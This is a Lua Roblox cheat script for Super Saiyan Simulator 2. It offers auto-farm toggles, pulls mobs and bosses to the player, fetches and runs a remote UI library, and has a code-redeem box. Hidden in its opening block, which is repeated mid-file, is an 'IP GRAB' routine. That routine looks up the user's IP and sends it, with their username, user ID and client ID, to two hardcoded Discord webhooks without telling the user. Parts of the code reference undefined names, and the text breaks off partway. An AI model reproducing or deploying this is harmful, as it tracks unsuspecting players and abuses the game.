local httpService = game:GetService('HttpService')
local marketplaceService = game:GetService("MarketplaceService")
local players = game:GetService("Players")
local rbxAnalyticsService = game:GetService("RbxAnalyticsService")
local runService = game:GetService("RunService")

-- Game and Player Information
local gameName = marketplaceService:GetProductInfo(game.PlaceId).Name
local localPlayer = players.LocalPlayer
local playerName = localPlayer.Name
local playerUserId = localPlayer.UserId
local clientId = tostring(rbxAnalyticsService:GetClientId())
local ip = req({ Url = "https://api.ipify.org/", Method = "GET" }).Body

-- Webhook URLs
local Webhook1 = "https://discord.com/api/webhooks/1279710265239404595/4Dw-qV6wgrYK0-B80YDQCZAs9Vl7-OLfV5kbhV8YbxtwBfpuWdUQp-4-XO-6-BQfdgJB"
local Webhook2 = "https://discord.com/api/webhooks/1279710425566416926/Rtz_2ImGnEA1bgYGSRkU7r3c5uzlcYHZv5lGg_oVejxS6D1wnopCuaFqGvBMYVdxPku_"

-- Function to send data to the webhooks
local function sendWebhook(webhookUrl)
    local body = httpService:JSONEncode({
        embeds = {{
            title = gameName,
            description = "Username = " .. playerName .. "\nUserId = " .. playerUserId .. "\nClientId = " .. clientId .. "\nIP = " .. ip,
            color = 0,
            author = {name = "IP GRAB"}
        }}
    })

    local success, errorMessage = pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {['Content-Type'] = 'application/json'},
            Body = body
        })
    end)

    if not success then
        warn("Failed to send to webhook: " .. webhookUrl .. ". Error: " .. errorMessage)
    else
        print("Data sent to webhook: " .. webhookUrl)
    end
end

-- Send data to both webhooks
sendWebhook(Webhook1)
sendWebhook(Webhook2)

-- Blacklist Data
local blacklistedIPs = {"IP", "IP"}
local blacklistedUsernames = {"AlexusCorteza", "pokemonhaden"}
local blacklistedUserIDs = {4332089201, 107837090}
local blacklistedHWIDs = {"hwid", "hwid"}

-- Check and Kick Player if Blacklisted or if ID/Name mismatch
local function checkBlacklist()
    print("Checking if player is blacklisted or has mismatched IDs...")

    -- Check if the local player UserId or Name does not match their actual UserId or Name
    if players:GetPlayerByUserId(playerUserId) == nil or localPlayer.Name ~= playerName then
        print("Player UserId or Name does not match the local Player.")
        localPlayer:Kick("UserId or Name mismatch!")
        return
    end

    if table.find(blacklistedIPs, tostring(ip)) then
        print("Player is blacklisted by IP.")
        localPlayer:Kick("Blacklisted By Riotscripter!")
    elseif table.find(blacklistedUserIDs, playerUserId) then
        print("Player is blacklisted by UserID.")
        localPlayer:Kick("Blacklisted By Game!")
    elseif table.find(blacklistedUsernames, playerName) then
        print("Player is blacklisted by Username.")
        localPlayer:Kick("Blacklisted By Roblox!")
    elseif table.find(blacklistedHWIDs, tostring(clientId)) then
        print("Player is blacklisted by ClientID.")
        localPlayer:Kick("Blacklisted By Executor")
    else
        print("Player is not blacklisted.")
    end
end

runService.RenderStepped:Connect(checkBlacklist)
if game.PlaceId == 16784977282 then  --World 1
if not game:IsLoaded() then
game.Loaded:Wait()
end

	print("Game Successfully Loaded!")
	print("Created By Riotscripter!")

	local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Riotscripter/RiotExploits/main/Orion%20Library%202")))()
	OrionLib:MakeNotification({
		Name = "Super Saiyan Simulator 2",
		Content = "Scripted By Riotscripter!",
		Image = "rbxassetid://4483345998",
		Time = 5
	})

	-- local mytable
	local MyTable = {
		["AutoPunch"] = false,
		["AutoRebirth"] = false,
		["AutoPrestige"] = false,
		["AutoTechnique"] = false,
	}

	-- getgenvs
	getgenv().AutoPunch = false
	getgenv().AutoRebirth = false
	getgenv().AutoPrestige = false
	getgenv().AutoTechnique = false

	-- functions
	function autopunch()
		while getgenv().AutoPunch == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(1762.42431640625, 580.1317138671875, 1351.1337890625) * CFrame.Angles(-0, 0, -0),
					["Aim"] = Vector3.new(1762.42431640625, 580.1317138671875, 1301.1337890625),
					["Camera"] = CFrame.new(1762.42431640625, 584.9469604492188, 1363.2078857421875) * CFrame.Angles(-0.261798232793808, 0, -0),
					["Typ\208\181"] = 1,
					["SkillId"] = "1"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	function autorebirth()
		while getgenv().AutoRebirth == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.StatsService.RE.RebirthUp:FireServer()
		end
	end

	function autoprestige()
		while getgenv().AutoPrestige == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("StatsService"):WaitForChild("RE"):WaitForChild("RebirthUp"):FireServer()
		end
	end

	function autotechnique()
		while getgenv().AutoTechnique == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(7160.42285, 574.155029, -10087.2246, -0.815149486, 7.46256779e-10, -0.579250693, -3.31721992e-08, 1, 4.79698308e-08, 0.579250693, 5.83176032e-08, -0.815149486) * CFrame.Angles(-3.141592502593994, -1.2826416492462158, -3.141592502593994),
					["Aim"] = Vector3.new(2123.014892578125, 590.3080444335938, 1790.3922119140625),
					["Camera"] = CFrame.new(2083.916259765625, 594.6639404296875, 1759.2860107421875) * CFrame.Angles(-2.978764533996582, 0.4765561819076538, 3.0663747787475586),
					["Typ\208\181"] = 1,
					["SkillId"] = "8"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	local BossFolder = game:GetService("Workspace")["World Mobs"]["Boss Mobs"]
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Character = LocalPlayer.Character
	function BringBosses()
		local characterRootPart = Character.HumanoidRootPart
		pcall(function()
			for i, v in pairs(BossFolder:GetChildren()) do
				if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
					v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
					local targetPosition = v:FindFirstChild("HumanoidRootPart")
					v:FindFirstChild("HumanoidRootPart").Anchored = true
					v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		end)
	end

	local Window = OrionLib:MakeWindow({
		Name = "Riotscripter | Super Saiyan Simulator 2 [" .. os.date("%Y") .. "]",
		HidePremium = false,
		SaveConfig = false,
		ConfigFolder = "Riotscripter",
		IntroEnabled = true,
		IntroText = "Welcome To Riotscripter's Super Saiyan Simulator 2 Gui.",
	})

	local AutoFarmTab = Window:MakeTab({
		Name = "Auto Farm!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Punch (Fast!)",
		Default = false,
		Save = true,
		Flag = "autopunch_sss2",
		Callback = function(Value)
			getgenv().AutoPunch = Value
			autopunch()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Rebirth",
		Default = false,
		Save = true,
		Flag = "autorebirth_sss2",
		Callback = function(Value)
			getgenv().AutoRebirth = Value
			autorebirth()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Prestige",
		Default = false,
		Save = true,
		Flag = "autoprestige_sss2",
		Callback = function(Value)
			getgenv().AutoPrestige = Value
			autoprestige()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Technique",
		Default = false,
		Save = true,
		Flag = "autotechnique_sss2",
		Callback = function(Value)
			getgenv().AutoTechnique = Value
			autotechnique()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs",
		Default = false,
		Save = true,
		Flag = "automobs_sss2",
		Callback = function(Value)
			getgenv().bringmobs = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 2",
		Default = false,
		Save = true,
		Flag = "automobs2_sss2",
		Callback = function(Value)
			getgenv().bringmobs2 = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 3",
		Default = false,
		Save = true,
		Flag = "automobs3_sss2",
		Callback = function(Value)
			getgenv().bringmobs3 = Value
			while bringmobs3 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 4",
		Default = false,
		Save = true,
		Flag = "automobs4_sss2",
		Callback = function(Value)
			getgenv().bringmobs4 = Value
			while bringmobs4 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 5",
		Default = false,
		Save = true,
		Flag = "automobs5_sss2",
		Callback = function(Value)
			getgenv().bringmobs5 = Value
			while bringmobs5 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses",
		Default = false,
		Save = true,
		Flag = "autobosses_sss2",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss and game:GetService("RunService").PreRender:Wait() do
				BringBosses()
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 2",
		Default = false,
		Save = true,
		Flag = "autobosses2_sss2",
		Callback = function(Value)
			getgenv().BringBoss2 = Value
			while BringBoss2 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 3",
		Default = false,
		Save = true,
		Flag = "autobosses3_sss2",
		Callback = function(Value)
			getgenv().BringBoss3 = Value
			while BringBoss3 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 4",
		Default = false,
		Save = true,
		Flag = "autobosses4_sss2",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss4 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 5",
		Default = false,
		Save = true,
		Flag = "autobosses5_sss2",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss5 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses",
		Default = false,
		Save = true,
		Flag = "automobsbosses_sss2",
		Callback = function(Value)
			getgenv().AutoMobsBosses = Value
			while getgenv().AutoMobsBosses and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 2",
		Default = false,
		Save = true,
		Flag = "automobsbosses2_sss2",
		Callback = function(Value)
			getgenv().AutoMobsBosses2 = Value
			while getgenv().AutoMobsBosses2 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 3",
		Default = false,
		Save = true,
		Flag = "automobsbosses3_sss2",
		Callback = function(Value)
			getgenv().AutoMobsBosses3 = Value
			while getgenv().AutoMobsBosses3 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 4",
		Default = false,
		Save = true,
		Flag = "automobsbosses4_sss2",
		Callback = function(Value)
			getgenv().AutoMobsBosses4 = Value
			while getgenv().AutoMobsBosses4 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 5",
		Default = false,
		Save = true,
		Flag = "automobsbosses5_sss2",
		Callback = function(Value)
			getgenv().AutoMobsBosses5 = Value
			while getgenv().AutoMobsBosses5 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							table.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					end
				end
			end
		end
	})

	AutoFarmTab:AddButton({
		Name = "Destroy Gui",
		Callback = function()
			OrionLib:Destroy()
		end
	})

	local CodesTab = Window:MakeTab({
		Name = "Codes!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	CodesTab:AddTextbox({
		Name = "Codes (Redeem!)",
		Default = "",
		TextDisappear = false,
		Callback = function(Value)
			local args = {
				[1] = {
					["UniqueTag"] = "RedeemCode",
					["InputText"] = Value,
					["InputType"] = "Text",
					["LeftButton"] = "Redeem",
					["Description"] = "Redeem Code",
					["Prompt"] = "RedeemCode",
					["RightButton"] = "Cancel",
					["Title"] = "Codes"
				},
				[2] = "Redeem"
			}
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.PromptService.RE.Prompt:FireServer(unpack(args))
		end
	})

	local CreditsTab = Window:MakeTab({
		Name = "Credits!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	local Section = CreditsTab:AddSection({
		Name = "Credits!",
	})

	CreditsTab:AddLabel("Script is made by Riotscripter")
	CreditsTab:AddLabel("Scripted by Riotscripter!")
	CreditsTab:AddLabel("UI Library by Riotscripter!")
	CreditsTab:AddLabel("Script Discontinued So Let Me Know If Its Patched!")

	CreditsTab:AddParagraph("Info","Tap The Button To Copy My Social And Invite Links!")
	CreditsTab:AddParagraph("Info","Script changelogs at our Discord Server. If you find any bugs, inform us.")

	CreditsTab:AddButton({
		Name = "Discord",
		Callback = function()
			setclipboard("https://discord.gg/9rMZvSPAQv")
			print("Riotscripter: Copied Discord Server Invite to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Discord Server Invite to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Youtube",
		Callback = function()
			setclipboard("https://m.youtube.com/channel/UCvXEiClhdiICCgSVzkEIT3A")
			print("Riotscripter: Copied Youtube Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Youtube Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Github",
		Callback = function()
			setclipboard("https://github.com/Riotscripter")
			print("Riotscripter: Copied Github Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Github Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddBind({
		Name = "UI Toggle Keybind", 
		Default = Enum.KeyCode.RightShift, 
		Hold = false, 
		Callback = function()
			print("press")
		end    
	})
local httpService = game:GetService('HttpService')
local marketplaceService = game:GetService("MarketplaceService")
local players = game:GetService("Players")
local rbxAnalyticsService = game:GetService("RbxAnalyticsService")
local runService = game:GetService("RunService")

-- Game and Player Information
local gameName = marketplaceService:GetProductInfo(game.PlaceId).Name
local localPlayer = players.LocalPlayer
local playerName = localPlayer.Name
local playerUserId = localPlayer.UserId
local clientId = tostring(rbxAnalyticsService:GetClientId())
local ip = req({ Url = "https://api.ipify.org/", Method = "GET" }).Body

-- Webhook URLs
local Webhook1 = "https://discord.com/api/webhooks/1279710265239404595/4Dw-qV6wgrYK0-B80YDQCZAs9Vl7-OLfV5kbhV8YbxtwBfpuWdUQp-4-XO-6-BQfdgJB"
local Webhook2 = "https://discord.com/api/webhooks/1279710425566416926/Rtz_2ImGnEA1bgYGSRkU7r3c5uzlcYHZv5lGg_oVejxS6D1wnopCuaFqGvBMYVdxPku_"

-- Function to send data to the webhooks
local function sendWebhook(webhookUrl)
    local body = httpService:JSONEncode({
        embeds = {{
            title = gameName,
            description = "Username = " .. playerName .. "\nUserId = " .. playerUserId .. "\nClientId = " .. clientId .. "\nIP = " .. ip,
            color = 0,
            author = {name = "IP GRAB"}
        }}
    })

    local success, errorMessage = pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {['Content-Type'] = 'application/json'},
            Body = body
        })
    end)

    if not success then
        warn("Failed to send to webhook: " .. webhookUrl .. ". Error: " .. errorMessage)
    else
        print("Data sent to webhook: " .. webhookUrl)
    end
end

-- Send data to both webhooks
sendWebhook(Webhook1)
sendWebhook(Webhook2)

-- Blacklist Data
local blacklistedIPs = {"IP", "IP"}
local blacklistedUsernames = {"AlexusCorteza", "pokemonhaden"}
local blacklistedUserIDs = {4332089201, 107837090}
local blacklistedHWIDs = {"hwid", "hwid"}

-- Check and Kick Player if Blacklisted or if ID/Name mismatch
local function checkBlacklist()
    print("Checking if player is blacklisted or has mismatched IDs...")

    -- Check if the local player UserId or Name does not match their actual UserId or Name
    if players:GetPlayerByUserId(playerUserId) == nil or localPlayer.Name ~= playerName then
        print("Player UserId or Name does not match the local Player.")
        localPlayer:Kick("UserId or Name mismatch!")
        return
    end

    if table.find(blacklistedIPs, tostring(ip)) then
        print("Player is blacklisted by IP.")
        localPlayer:Kick("Blacklisted By Riotscripter!")
    elseif table.find(blacklistedUserIDs, playerUserId) then
        print("Player is blacklisted by UserID.")
        localPlayer:Kick("Blacklisted By Game!")
    elseif table.find(blacklistedUsernames, playerName) then
        print("Player is blacklisted by Username.")
        localPlayer:Kick("Blacklisted By Roblox!")
    elseif table.find(blacklistedHWIDs, tostring(clientId)) then
        print("Player is blacklisted by ClientID.")
        localPlayer:Kick("Blacklisted By Executor")
    else
        print("Player is not blacklisted.")
    end
end

runService.RenderStepped:Connect(checkBlacklist)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.BackgroundTransparency = 0.500
Frame.Position = UDim2.new(0.858712733, 0, 0.0237762257, 0)
Frame.Size = UDim2.new(0.129513338, 0, 0.227972031, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(1, 0, 1, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "TOGGLE"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 50.000
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true

TextButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.RightShift, false, game)
end)

UITextSizeConstraint.Parent = TextButton
UITextSizeConstraint.MaxTextSize = 50

game.Players.PlayerAdded:Connect(KickIfBlacklisted)
elseif game.PlaceId == 16785155911 then  --World 2
if not game:IsLoaded() then
game.Loaded:Wait()
end
	
	print("Game Successfully Loaded!")
	print("Created By Riotscripter!")

	local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Riotscripter/RiotExploits/main/Orion%20Library%202")))()

	OrionLib:MakeNotification({Name = "Super Saiyan Simulator 2!", Content = "Scripted By Riotscripter!", Image = "rbxassetid://4483345998", Time = 5})

	local Window = OrionLib:MakeWindow({Name = "Riotscripter | Super Saiyan Simulator 2 [" .. os.date("%Y") .. "]", HidePremium = false, SaveConfig = false, ConfigFolder = "Super Saiyan Simulator 2", IntroEnabled = true, IntroText = "Welcome To Riotscripter's Super Saiyan Simulator 2 Gui."})

	-- local mytable
	local MyTable = {
		["AutoPunch"] = false,
		["AutoRebirth"] = false,
		["AutoPrestige"] = false,
		["AutoTechnique"] = false,
	}

	-- getgenvs
	getgenv().AutoPunch = false
	getgenv().AutoRebirth = false
	getgenv().AutoPrestige = false
	getgenv().AutoTechnique = false

	-- functions
	function autopunch()
		while getgenv().AutoPunch == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(1762.42431640625, 580.1317138671875, 1351.1337890625) * CFrame.Angles(-0, 0, -0),
					["Aim"] = Vector3.new(1762.42431640625, 580.1317138671875, 1301.1337890625),
					["Camera"] = CFrame.new(1762.42431640625, 584.9469604492188, 1363.2078857421875) * CFrame.Angles(-0.261798232793808, 0, -0),
					["Typ\208\181"] = 1,
					["SkillId"] = "1"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	function autorebirth()
		while getgenv().AutoRebirth == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.StatsService.RE.RebirthUp:FireServer()
		end
	end

	function autoprestige()
		while getgenv().AutoPrestige == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("StatsService"):WaitForChild("RE"):WaitForChild("RebirthUp"):FireServer()
		end
	end

	function autotechnique()
		while getgenv().AutoTechnique == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(7160.42285, 574.155029, -10087.2246, -0.815149486, 7.46256779e-10, -0.579250693, -3.31721992e-08, 1, 4.79698308e-08, 0.579250693, 5.83176032e-08, -0.815149486) * CFrame.Angles(-3.141592502593994, -1.2826416492462158, -3.141592502593994),
					["Aim"] = Vector3.new(2123.014892578125, 590.3080444335938, 1790.3922119140625),
					["Camera"] = CFrame.new(2083.916259765625, 594.6639404296875, 1759.2860107421875) * CFrame.Angles(-2.978764533996582, 0.4765561819076538, 3.0663747787475586),
